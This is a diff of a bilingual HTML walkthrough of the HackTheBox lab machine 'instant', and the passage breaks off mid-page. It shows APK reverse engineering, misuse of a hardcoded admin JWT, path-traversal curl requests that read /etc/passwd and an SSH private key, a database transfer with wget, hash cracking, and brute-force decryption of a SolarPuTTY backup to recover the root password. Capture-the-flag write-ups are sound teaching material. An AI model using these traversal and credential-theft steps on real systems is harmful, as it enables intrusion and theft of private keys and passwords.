@@ -2,146 +2,182 @@
 <html lang="es" data-theme="light">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>instant | Writeup</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link
-        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
-        rel="stylesheet">
-    <link rel="stylesheet" href="../../index.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>instant | Writeup</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="../../index.css">
 </head>
 
 <body>
-    <nav class="top-nav">
-        <div class="container">
-            <div class="nav-content">
-                <div class="nav-left">
-                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
-                    <h1 data-i18n="site-title">KDW_LABS</h1>
-                </div>
-                <div class="nav-controls">
-                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
-                        <span class="theme-icon">🌙</span>
-                    </button>
-                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
-                        <span>EN</span>
-                    </button>
-                </div>
-            </div>
+  <nav class="top-nav">
+    <div class="container">
+      <div class="nav-content">
+        <div class="nav-left">
+          <a href="../../index.html" class="back-link" title="Back to home">←</a>
+          <h1 data-i18n="site-title">KDW_LABS</h1>
         </div>
-    </nav>
+        <div class="nav-controls">
+          <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+            <span class="theme-icon">🌙</span>
+          </button>
+          <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+            <span>EN</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </nav>
 
-    <main class="container">
-        <header class="machine-header">
-            <h1 class="machine-title">instant</h1>
-            <div class="machine-meta">
-                <span class="badge badge-platform">HTB</span>
-                <span class="badge badge-difficulty-medium">medium</span>
-            </div>
-        </header>
+  <main class="container">
+    <header class="machine-header">
+      <h1 class="machine-title">instant</h1>
+      <div class="machine-meta">
+        <span class="badge badge-platform">HTB</span>
+        <span class="badge badge-difficulty-medium">medium</span>
+      </div>
+    </header>
 
-        <article class="machine-content">
-            <div id="content-en" class="lang-content">
-                <div class="machine-summary">
-                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
-                    <p><strong>Exploitation process:</strong> The target machine was hosting a mobile wallet application available as an APK download. After decompiling the APK with <code>apktool</code>, I discovered two hidden subdomains in the network security configuration: one hosting an API (<code>mywalletv1.instant.htb</code>) and another hosting its Swagger documentation (<code>swagger-ui.instant.htb</code>). Further analysis of the decompiled APK revealed a hardcoded admin JWT token in the <code>AdminActivities</code> class, which granted elevated privileges to interact with the API. Using this admin token, I exploited a Local File Inclusion (LFI) vulnerability in the <code>/api/v1/admin/read/log</code> endpoint to read arbitrary files from the filesystem. Through this vulnerability, I extracted the SSH private key of the user <code>shirohige</code> from <code>/home/shirohige/.ssh/id_rsa</code>, obtaining initial user access. For privilege escalation, I discovered an encrypted SolarPuTTY session backup file at <code>/opt/backups/Solar-PuTTY/sessions-backup.dat</code>. Using a Python script to brute-force the encryption passphrase with <code>rockyou.txt</code>, I decrypted the file and obtained root credentials stored within the session data, granting full system access.</p>
-                    <p><strong>Technologies/Exploits:</strong> APK reverse engineering with apktool, JWT token authentication bypass via hardcoded credentials, API Local File Inclusion (LFI), SolarPuTTY session file decryption, credential extraction from encrypted backups.</p>
-                </div>
-                <hr class="summary-divider">
-                
-                <h2>Initial Reconnaissance</h2>
-                <p>I begin with an nmap scan to identify open ports and services on the target machine:</p>
-                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" /></p>
-                
-                <p>The scan reveals two main services: SSH on port 22 and HTTP on port 80. I add <code>instant.htb</code> to my <code>/etc/hosts</code> file and proceed to explore the web service.</p>
-                
-                <h2>Web Enumeration</h2>
-                <p>The web application appears to be a mobile wallet service that allows instant money transfers. The website promotes an Android application and provides a download link for the APK file at <code>http://instant.htb/downloads/instant.apk</code>.</p>
-                
-                <p>I run directory and vhost enumeration with <code>gobuster</code>, but don't find any additional interesting endpoints or virtual hosts initially. Since the web application itself doesn't reveal much useful information and gobuster returns no interesting results, I decide to analyze the mobile application directly.</p>
-                
-                <h2>APK Analysis - Reverse Engineering</h2>
-                <p>I download the APK file and decompile it using <code>apktool</code>, a tool for reverse engineering Android applications (<a href="https://www.kali.org/tools/apktool/">https://www.kali.org/tools/apktool/</a>).</p>
-                
-                <pre><code class="language-bash">apktool d instant.apk</code></pre>
-                
-                <p>After decompiling, I explore the application structure looking for configuration files, hardcoded credentials, or any sensitive information. At first glance, there's no obvious configuration or credentials visible in the main files.</p>
-                
-                <h3>Discovering Hidden Subdomains</h3>
-                <p>I open the decompiled source in Visual Studio Code for a more thorough analysis. While I don't find any hardcoded credentials initially, I discover something interesting in the file <code>/res/xml/network_security_config.xml</code>:</p>
-                
-                <pre><code class="language-xml">&lt;domain-config cleartextTrafficPermitted="true"&gt;
+    <article class="machine-content">
+      <div id="content-en" class="lang-content">
+        <div class="machine-summary">
+          <h2 data-i18n="summary-title">Exploitation Summary</h2>
+          <p><strong>Exploitation process:</strong> The target machine was hosting a mobile wallet application available
+            as an APK download. After decompiling the APK with <code>apktool</code>, I discovered two hidden subdomains
+            in the network security configuration: one hosting an API (<code>mywalletv1.instant.htb</code>) and another
+            hosting its Swagger documentation (<code>swagger-ui.instant.htb</code>). Further analysis of the decompiled
+            APK revealed a hardcoded admin JWT token in the <code>AdminActivities</code> class, which granted elevated
+            privileges to interact with the API.</p>
+          <p>Using this admin token, I exploited a Local File Inclusion (LFI) vulnerability in the
+            <code>/api/v1/admin/read/log</code> endpoint to read arbitrary files from the filesystem. Through this
+            vulnerability, I extracted the SSH private key of the user <code>shirohige</code> from
+            <code>/home/shirohige/.ssh/id_rsa</code>, obtaining initial user access.</p>
+          <p>For privilege escalation, I discovered an encrypted SolarPuTTY session backup file at
+            <code>/opt/backups/Solar-PuTTY/sessions-backup.dat</code>. Using a Python script to brute-force the
+            encryption passphrase with <code>rockyou.txt</code>, I decrypted the file and obtained root credentials
+            stored within the session data, granting full system access.</p>
+          <p><strong>Technologies/Exploits:</strong> APK reverse engineering with apktool, JWT token authentication
+            bypass via hardcoded credentials, API Local File Inclusion (LFI), SolarPuTTY session file decryption,
+            credential extraction from encrypted backups.</p>
+        </div>
+        <hr class="summary-divider">
+
+        <h2>Initial Reconnaissance</h2>
+        <p>I begin with an nmap scan to identify open ports and services on the target machine:</p>
+        <p><img src="./media/image1.png"
+            alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" /></p>
+
+        <p>The scan reveals two main services: SSH on port 22 and HTTP on port 80. I add <code>instant.htb</code> to my
+          <code>/etc/hosts</code> file and proceed to explore the web service.</p>
+
+        <h2>Web Enumeration</h2>
+        <p>The web application appears to be a mobile wallet service that allows instant money transfers. The website
+          promotes an Android application and provides a download link for the APK file at
+          <code>http://instant.htb/downloads/instant.apk</code>.</p>
+
+        <p>I run directory and vhost enumeration with <code>gobuster</code>, but don't find any additional interesting
+          endpoints or virtual hosts initially. Since the web application itself doesn't reveal much useful information
+          and gobuster returns no interesting results, I decide to analyze the mobile application directly.</p>
+
+        <h2>APK Analysis - Reverse Engineering</h2>
+        <p>I download the APK file and decompile it using <code>apktool</code>, a tool for reverse engineering Android
+          applications (<a href="https://www.kali.org/tools/apktool/">https://www.kali.org/tools/apktool/</a>).</p>
+
+        <pre><code class="language-bash">apktool d instant.apk</code></pre>
+
+        <p>After decompiling, I explore the application structure looking for configuration files, hardcoded
+          credentials, or any sensitive information. At first glance, there's no obvious configuration or credentials
+          visible in the main files.</p>
+
+        <h3>Discovering Hidden Subdomains</h3>
+        <p>I open the decompiled source in Visual Studio Code for a more thorough analysis. While I don't find any
+          hardcoded credentials initially, I discover something interesting in the file
+          <code>/res/xml/network_security_config.xml</code>:</p>
+
+        <pre><code class="language-xml">&lt;domain-config cleartextTrafficPermitted="true"&gt;
     &lt;domain includeSubdomains="true"&gt;mywalletv1.instant.htb&lt;/domain&gt;
     &lt;domain includeSubdomains="true"&gt;swagger-ui.instant.htb&lt;/domain&gt;
 &lt;/domain-config&gt;</code></pre>
-                
-                <p>This configuration reveals two subdomains that weren't discovered during my initial enumeration. I add both domains to my <code>/etc/hosts</code> file:</p>
-                
-                <pre><code class="language-bash">echo "10.10.11.37 instant.htb mywalletv1.instant.htb swagger-ui.instant.htb" | sudo tee -a /etc/hosts</code></pre>
-                
-                <h2>API Exploration - Swagger Documentation</h2>
-                <p>Navigating to <code>swagger-ui.instant.htb</code>, I find comprehensive API documentation:</p>
-                
-                <p><img src="./media/image2.png" alt="Swagger UI interface showing the complete API documentation with available endpoints" /></p>
-                
-                <p>The Swagger interface reveals the complete API structure with all available endpoints, request formats, and expected responses. The API appears to handle user registration, authentication, wallet operations, and administrative functions. One subdomain (<code>mywalletv1.instant.htb</code>) hosts the actual API, while the other provides its Swagger documentation for easy navigation.</p>
-                
-                <h2>API Interaction - User Registration and Authentication</h2>
-                <p>Based on the Swagger documentation, I proceed to register a test user account:</p>
-                
-                <pre><code class="language-bash">curl -X POST 'http://mywalletv1.instant.htb/api/v1/register' \
+
+        <p>This configuration reveals two subdomains that weren't discovered during my initial enumeration. I add both
+          domains to my <code>/etc/hosts</code> file:</p>
+
+        <pre><code class="language-bash">echo "10.10.11.37 instant.htb mywalletv1.instant.htb swagger-ui.instant.htb" | sudo tee -a /etc/hosts</code></pre>
+
+        <h2>API Exploration - Swagger Documentation</h2>
+        <p>Navigating to <code>swagger-ui.instant.htb</code>, I find comprehensive API documentation:</p>
+
+        <p><img src="./media/image2.png"
+            alt="Swagger UI interface showing the complete API documentation with available endpoints" /></p>
+
+        <p>The Swagger interface reveals the complete API structure with all available endpoints, request formats, and
+          expected responses. The API appears to handle user registration, authentication, wallet operations, and
+          administrative functions. One subdomain (<code>mywalletv1.instant.htb</code>) hosts the actual API, while the
+          other provides its Swagger documentation for easy navigation.</p>
+
+        <h2>API Interaction - User Registration and Authentication</h2>
+        <p>Based on the Swagger documentation, I proceed to register a test user account:</p>
+
+        <pre><code class="language-bash">curl -X POST 'http://mywalletv1.instant.htb/api/v1/register' \
   -d '{"email":"asd@asd.com", "password":"xd", "pin":"12345", "username":"asd"}' \
   -H "Content-Type: application/json"</code></pre>
-                
-                <p>After successful registration, I authenticate to obtain an access token:</p>
-                
-                <pre><code class="language-bash">curl -X POST 'http://mywalletv1.instant.htb/api/v1/login' \
+
+        <p>After successful registration, I authenticate to obtain an access token:</p>
+
+        <pre><code class="language-bash">curl -X POST 'http://mywalletv1.instant.htb/api/v1/login' \
   -d '{"password":"xd", "username":"asd"}' \
   -H "Content-Type: application/json"</code></pre>
-                
-                <p>The API responds with a JWT token:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>The API responds with a JWT token:</p>
+
+        <pre><code class="language-json">{
   "Access-Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Mywicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6Ijg0MDBiOGFkLTU2OTgtNDA2MC1iNmI1LTBmMDE0M2U5MGQ4NyIsImV4cCI6MTc1OTY5MDc2MX0.sLX6MkZpwf4TbxITnRU_E2vpPG7RiIgYRjKi1_S8B30",
   "Status": 201
 }</code></pre>
-                
-                <p>Decoding the JWT payload reveals:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>Decoding the JWT payload reveals:</p>
+
+        <pre><code class="language-json">{
   "id": 3,
   "role": "instantian",
   "walId": "8400b8ad-5698-4060-b6b5-0f0143e90d87"
 }</code></pre>
-                
-                <p>My user has the role <code>instantian</code>, which appears to be a regular user role. I attempt to use this token with the standard <code>Authorization: Bearer {token}</code> header format, but it doesn't work as expected.</p>
-                
-                <h2>Privilege Escalation - Finding Admin Token</h2>
-                <p>While searching through the decompiled APK for information about how to properly use the Authorization header, I make a critical discovery in the <code>AdminActivities</code> class. The application contains a hardcoded admin JWT token:</p>
-                
-                <pre><code class="language-plaintext">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA</code></pre>
-                
-                <p>Decoding this token reveals elevated privileges:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>My user has the role <code>instantian</code>, which appears to be a regular user role. I attempt to use this
+          token with the standard <code>Authorization: Bearer {token}</code> header format, but it doesn't work as
+          expected.</p>
+
+        <h2>Privilege Escalation - Finding Admin Token</h2>
+        <p>While searching through the decompiled APK for information about how to properly use the Authorization
+          header, I make a critical discovery in the <code>AdminActivities</code> class. The application contains a
+          hardcoded admin JWT token:</p>
+
+        <pre><code class="language-plaintext">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA</code></pre>
+
+        <p>Decoding this token reveals elevated privileges:</p>
+
+        <pre><code class="language-json">{
   "id": 1,
   "role": "Admin",
   "walId": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
 }</code></pre>
-                
-                <p>This token has the <code>Admin</code> role and an extremely distant expiration date. I also discover that the correct header format is simply <code>Authorization: {token}</code> without the "Bearer" prefix.</p>
-                
-                <h3>Accessing Admin Functionality</h3>
-                <p>Using the admin token with the correct header format, I can now access privileged API endpoints:</p>
-                
-                <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/view/profile' \
+
+        <p>This token has the <code>Admin</code> role and an extremely distant expiration date. I also discover that the
+          correct header format is simply <code>Authorization: {token}</code> without the "Bearer" prefix.</p>
+
+        <h3>Accessing Admin Functionality</h3>
+        <p>Using the admin token with the correct header format, I can now access privileged API endpoints:</p>
+
+        <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/view/profile' \
   -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"</code></pre>
-                
-                <p>This returns the admin profile:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>This returns the admin profile:</p>
+
+        <pre><code class="language-json">{
   "Profile": {
     "account_status": "active",
     "email": "admin@instant.htb",
@@ -153,10 +189,10 @@
   },
   "Status": 200
 }</code></pre>
-                
-                <p>I can also enumerate all users in the system:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>I can also enumerate all users in the system:</p>
+
+        <pre><code class="language-json">{
   "Status": 200,
   "Users": [
     {
@@ -185,20 +221,22 @@
     }
   ]
 }</code></pre>
-                
-                <p>This reveals another interesting user: <code>shirohige</code>, who might have system access.</p>
-                
-                <h2>Local File Inclusion - Reading Arbitrary Files</h2>
-                <p>Exploring the admin endpoints further, I test the log reading functionality at <code>/api/v1/admin/read/log</code>. This endpoint accepts a <code>log_file_name</code> parameter, which immediately suggests a potential Local File Inclusion vulnerability.</p>
-                
-                <p>I test for LFI by attempting to read <code>/etc/passwd</code>:</p>
-                
-                <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../etc/passwd' \
+
+        <p>This reveals another interesting user: <code>shirohige</code>, who might have system access.</p>
+
+        <h2>Local File Inclusion - Reading Arbitrary Files</h2>
+        <p>Exploring the admin endpoints further, I test the log reading functionality at
+          <code>/api/v1/admin/read/log</code>. This endpoint accepts a <code>log_file_name</code> parameter, which
+          immediately suggests a potential Local File Inclusion vulnerability.</p>
+
+        <p>I test for LFI by attempting to read <code>/etc/passwd</code>:</p>
+
+        <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../etc/passwd' \
   -H "Authorization: {admin_token}"</code></pre>
-                
-                <p>Success! The API returns the contents of <code>/etc/passwd</code>:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>Success! The API returns the contents of <code>/etc/passwd</code>:</p>
+
+        <pre><code class="language-json">{
   "/home/shirohige/logs/../../../../../../../etc/passwd": [
     "root:x:0:0:root:/root:/bin/bash",
     "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
@@ -206,200 +244,258 @@
     "shirohige:x:1000:1000:shirohige:/home/shirohige:/bin/bash"
   ]
 }</code></pre>
-                
-                <p>The vulnerability confirms that the user <code>shirohige</code> exists on the system and has bash shell access. Before attempting to identify the underlying technology, I decide to check if I can directly access SSH keys.</p>
-                
-                <h3>Extracting SSH Private Key</h3>
-                <p>I attempt to read the SSH private key for the <code>shirohige</code> user:</p>
-                
-                <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../home/shirohige/.ssh/id_rsa' \
+
+        <p>The vulnerability confirms that the user <code>shirohige</code> exists on the system and has bash shell
+          access. Before attempting to identify the underlying technology, I decide to check if I can directly access
+          SSH keys.</p>
+
+        <h3>Extracting SSH Private Key</h3>
+        <p>I attempt to read the SSH private key for the <code>shirohige</code> user:</p>
+
+        <pre><code class="language-bash">curl -X GET 'http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../../../../../home/shirohige/.ssh/id_rsa' \
   -H "Authorization: {admin_token}"</code></pre>
-                
-                <p>The LFI vulnerability successfully retrieves the private SSH key! I save this key to a file, set appropriate permissions, and use it to gain SSH access:</p>
-                
-                <pre><code class="language-bash">chmod 600 id_rsa
+
+        <p>The LFI vulnerability successfully retrieves the private SSH key! I save this key to a file, set appropriate
+          permissions, and use it to gain SSH access:</p>
+
+        <pre><code class="language-bash">chmod 600 id_rsa
 ssh -i id_rsa shirohige@instant.htb</code></pre>
-                
-                <p>I successfully connect as <code>shirohige</code> and can retrieve the user flag.</p>
-                
-                <h2>Post-Exploitation Enumeration</h2>
-                <p>After gaining user access, I perform additional enumeration to identify privilege escalation vectors.</p>
-                
-                <h3>Internal Services</h3>
-                <p>Using <code>ss -tuln</code>, I discover two locally-bound ports: 8888 and 8808. Upon investigation, these turn out to be the API and Swagger services that are being reverse-proxied to the internet-facing domains.</p>
-                
-                <h3>API Source Code Analysis</h3>
-                <p>I locate the API project directory and examine the source code. I find a hardcoded secret key:</p>
-                
-                <pre><code class="language-plaintext">VeryStrongS3cretKeyY0uC4NTGET</code></pre>
-                
-                <p>While this might be interesting, it doesn't immediately provide a path to privilege escalation.</p>
-                
-                <h3>Database Analysis</h3>
-                <p>Within the API project, I discover an SQLite3 database. Since <code>sqlite3</code> isn't installed on the target machine, I transfer the database to my local machine using a Python HTTP server:</p>
-                
-                <pre><code class="language-bash"># On target
+
+        <p>I successfully connect as <code>shirohige</code> and can retrieve the user flag.</p>
+
+        <h2>Post-Exploitation Enumeration</h2>
+        <p>After gaining user access, I perform additional enumeration to identify privilege escalation vectors.</p>
+
+        <h3>Internal Services</h3>
+        <p>Using <code>ss -tuln</code>, I discover two locally-bound ports: 8888 and 8808. Upon investigation, these
+          turn out to be the API and Swagger services that are being reverse-proxied to the internet-facing domains.</p>
+
+        <h3>API Source Code Analysis</h3>
+        <p>I locate the API project directory and examine the source code. I find a hardcoded secret key:</p>
+
+        <pre><code class="language-plaintext">VeryStrongS3cretKeyY0uC4NTGET</code></pre>
+
+        <p>While this might be interesting, it doesn't immediately provide a path to privilege escalation.</p>
+
+        <h3>Database Analysis</h3>
+        <p>Within the API project, I discover an SQLite3 database. Since <code>sqlite3</code> isn't installed on the
+          target machine, I transfer the database to my local machine using a Python HTTP server:</p>
+
+        <pre><code class="language-bash"># On target
 python3 -m http.server 9000
 
 # On attacker machine
 wget http://instant.htb:9000/database.db</code></pre>
-                
-                <p>Examining the database locally, I find a users table containing hashed passwords:</p>
-                
-                <pre><code class="language-plaintext">admin:pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
+
+        <p>Examining the database locally, I find a users table containing hashed passwords:</p>
+
+        <pre><code class="language-plaintext">admin:pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
 shirohige:pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed</code></pre>
-                
-                <p>These appear to be PBKDF2-SHA256 hashes commonly used by Django and Flask applications. To crack them with hashcat, I need to format them correctly. Hashcat expects the format:</p>
-                
-                <pre><code class="language-plaintext">pbkdf2_sha256$iterations$salt$hash_in_base64</code></pre>
-                
-                <p>I convert the format by replacing colons with underscores and dollar signs, and ensuring the hash digest is base64-encoded (the salt is already in base64 format):</p>
-                
-                <pre><code class="language-bash">hashcat -m 10000 hashes.txt rockyou.txt</code></pre>
-                
-                <p>Unfortunately, after running hashcat for a considerable time, I'm unable to crack either password. This suggests I need to find another privilege escalation path.</p>
-                
-                <h2>Privilege Escalation - SolarPuTTY Session Decryption</h2>
-                <p>Continuing my enumeration, I explore the <code>/opt</code> directory and discover something unusual in <code>/opt/backups/Solar-PuTTY</code> - a file named <code>sessions-backup.dat</code>.</p>
-                
-                <p>SolarPuTTY is a PuTTY alternative that stores SSH session configurations, including credentials. These session files are encrypted, but can potentially be decrypted if we can brute-force or obtain the passphrase.</p>
-                
-                <h3>Finding a Decryption Tool</h3>
-                <p>I search for tools to decrypt SolarPuTTY session files and first find this repository: <a href="https://github.com/VoidSec/SolarPuttyDecrypt">https://github.com/VoidSec/SolarPuttyDecrypt</a></p>
-                
-                <p>However, this tool is somewhat outdated and the Ruby script doesn't work properly with the current session file format. Continuing my research, I discover a Python script in a GitHub gist that's more up-to-date:</p>
-                
-                <p><a href="https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5">https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5</a></p>
-                
-                <p>This Python script can brute-force the encryption passphrase for SolarPuTTY session backup files.</p>
-                
-                <h3>Cracking the Session File</h3>
-                <p>I transfer the <code>sessions-backup.dat</code> file to my local machine and run the decryption script with the <code>rockyou.txt</code> wordlist:</p>
-                
-                <pre><code class="language-bash">python3 solarputty_decrypt.py sessions-backup.dat rockyou.txt</code></pre>
-                
-                <p>After some processing time, the script successfully cracks the encryption passphrase: <code>estrella</code></p>
-                
-                <p>Using this passphrase, the script decrypts the session data and reveals stored credentials, including:</p>
-                
-                <pre><code class="language-json">{
+
+        <p>These appear to be PBKDF2-SHA256 hashes commonly used by Django and Flask applications. To crack them with
+          hashcat, I need to format them correctly. Hashcat expects the format:</p>
+
+        <pre><code class="language-plaintext">pbkdf2_sha256$iterations$salt$hash_in_base64</code></pre>
+
+        <p>I convert the format by replacing colons with underscores and dollar signs, and ensuring the hash digest is
+          base64-encoded (the salt is already in base64 format):</p>
+
+        <pre><code class="language-bash">hashcat -m 10000 hashes.txt rockyou.txt</code></pre>
+
+        <p>Unfortunately, after running hashcat for a considerable time, I'm unable to crack either password. This
+          suggests I need to find another privilege escalation path.</p>
+
+        <h2>Privilege Escalation - SolarPuTTY Session Decryption</h2>
+        <p>Continuing my enumeration, I explore the <code>/opt</code> directory and discover something unusual in
+          <code>/opt/backups/Solar-PuTTY</code> - a file named <code>sessions-backup.dat</code>.</p>
+
+        <p>SolarPuTTY is a PuTTY alternative that stores SSH session configurations, including credentials. These
+          session files are encrypted, but can potentially be decrypted if we can brute-force or obtain the passphrase.
+        </p>
+
+        <h3>Finding a Decryption Tool</h3>
+        <p>I search for tools to decrypt SolarPuTTY session files and first find this repository: <a
+            href="https://github.com/VoidSec/SolarPuttyDecrypt">https://github.com/VoidSec/SolarPuttyDecrypt</a></p>
+
+        <p>However, this tool is somewhat outdated and the Ruby script doesn't work properly with the current session
+          file format. Continuing my research, I discover a Python script in a GitHub gist that's more up-to-date:</p>
+
+        <p><a
+            href="https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5">https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5</a>
+        </p>
+
+        <p>This Python script can brute-force the encryption passphrase for SolarPuTTY session backup files.</p>
+
+        <h3>Cracking the Session File</h3>
+        <p>I transfer the <code>sessions-backup.dat</code> file to my local machine and run the decryption script with
+          the <code>rockyou.txt</code> wordlist:</p>
+
+        <pre><code class="language-bash">python3 solarputty_decrypt.py sessions-backup.dat rockyou.txt</code></pre>
+
+        <p>After some processing time, the script successfully cracks the encryption passphrase: <code>estrella</code>
+        </p>
+
+        <p>Using this passphrase, the script decrypts the session data and reveals stored credentials, including:</p>
+
+        <pre><code class="language-json">{
   "Username": "root",
   "Password": "12**24nzC!r0c%q12"
 }</code></pre>
-                
-                <h3>Root Access</h3>
-                <p>With the root credentials extracted from the SolarPuTTY session backup, I can now escalate privileges:</p>
-                
-                <pre><code class="language-bash">su root
-# Enter password: 12**24nzC!r0c%q12</code></pre>
-                
-                <p>Alternatively, I can use SSH directly with these credentials:</p>
-                
-                <pre><code class="language-bash">ssh root@instant.htb
-# Enter password: 12**24nzC!r0c%q12</code></pre>
-                
-                <p>I successfully gain root access and can retrieve the root flag, completing the machine.</p>
-            </div>
 
-            <div id="content-es" class="lang-content" style="display:none;">
-                <div class="machine-summary">
-                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
-                    <p><strong>Resumen del proceso:</strong> La máquina objetivo alojaba una aplicación de monedero móvil disponible como descarga APK. Tras decompilar el APK con <code>apktool</code>, descubrí dos subdominios ocultos en la configuración de seguridad de red: uno alojando una API (<code>mywalletv1.instant.htb</code>) y otro alojando su documentación Swagger (<code>swagger-ui.instant.htb</code>). Un análisis más profundo del APK decomilado reveló un token JWT de administrador hardcodeado en la clase <code>AdminActivities</code>, que otorgaba privilegios elevados para interactuar con la API. Usando este token de admin, exploté una vulnerabilidad de Local File Inclusion (LFI) en el endpoint <code>/api/v1/admin/read/log</code> para leer archivos arbitrarios del sistema de archivos. A través de esta vulnerabilidad, extraje la clave privada SSH del usuario <code>shirohige</code> desde <code>/home/shirohige/.ssh/id_rsa</code>, obteniendo acceso inicial de usuario. Para la escalada de privilegios, descubrí un archivo de backup de sesión SolarPuTTY encriptado en <code>/opt/backups/Solar-PuTTY/sessions-backup.dat</code>. Usando un script Python para realizar fuerza bruta sobre la contraseña de encriptación con <code>rockyou.txt</code>, descifré el archivo y obtuve credenciales de root almacenadas dentro de los datos de sesión, consiguiendo acceso completo al sistema.</p>
-                    <p><strong>Tecnologías/Exploits:</strong> Ingeniería inversa de APK con apktool, bypass de autenticación JWT mediante credenciales hardcodeadas, Local File Inclusion (LFI) en API, descifrado de archivos de sesión SolarPuTTY, extracción de credenciales desde backups encriptados.</p>
-                </div>
-                <hr class="summary-divider">
-                
-                <h2>Reconocimiento Inicial</h2>
-                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
-                <p><img src="./media/image1.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" /></p>
-                
-                <p>El escaneo revela dos servicios principales: SSH en el puerto 22 y HTTP en el puerto 80. Añado <code>instant.htb</code> a mi archivo <code>/etc/hosts</code> y procedo a explorar el servicio web.</p>
-                
-                <h2>Enumeración Web</h2>
-                <p>La aplicación web parece ser un servicio de monedero móvil que permite transferencias de dinero instantáneas. El sitio web promociona una aplicación Android y proporciona un enlace de descarga para el archivo APK en <code>http://instant.htb/downloads/instant.apk</code>.</p>
-                
-                <p>Ejecuto enumeración de directorios y vhosts con <code>gobuster</code>, pero inicialmente no encuentro ningún endpoint adicional interesante o hosts virtuales. Como la aplicación web en sí no revela mucha información útil y gobuster no devuelve resultados interesantes, decido analizar la aplicación móvil directamente.</p>
-                
-                <h2>Análisis del APK - Ingeniería Inversa</h2>
-                <p>Descargo el archivo APK y lo descompilo usando <code>apktool</code>, una herramienta para ingeniería inversa de aplicaciones Android (<a href="https://www.kali.org/tools/apktool/">https://www.kali.org/tools/apktool/</a>).</p>
-                
-                <pre><code class="language-bash">apktool d instant.apk</code></pre>
-                
-                <p>Tras descompilar, exploro la estructura de la aplicación buscando archivos de configuración, credenciales hardcodeadas o cualquier información sensible. A primera vista, no hay ninguna configuración obvia o credenciales visibles en los archivos principales.</p>
-                
-                <h3>Descubriendo Subdominios Ocultos</h3>
-                <p>Abro el código decomilado en Visual Studio Code para un análisis más exhaustivo. Aunque no encuentro ninguna credencial hardcodeada inicialmente, descubro algo interesante en el archivo <code>/res/xml/network_security_config.xml</code>:</p>
-                
-                <pre><code class="language-xml">&lt;domain-config cleartextTrafficPermitted="true"&gt;
+        <h3>Root Access</h3>
+        <p>With the root credentials extracted from the SolarPuTTY session backup, I can now escalate privileges:</p>
+
